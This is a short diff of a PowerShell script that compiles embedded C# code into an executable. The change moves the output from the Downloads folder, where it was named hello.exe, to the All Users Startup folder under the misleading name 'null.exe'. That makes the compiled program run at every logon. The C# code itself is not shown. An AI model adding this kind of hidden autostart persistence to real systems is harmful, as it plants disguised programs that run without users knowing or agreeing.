@@ -16,7 +16,8 @@ namespace test
     }
 }
 "@
-$outpath  =  "$env:userprofile\downloads\hello.exe" 
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+$outpath  =  "$startupfolder\null.exe"
 $dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
 $dict.Add('CompilerVersion','v4.0')
 $CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider $dict
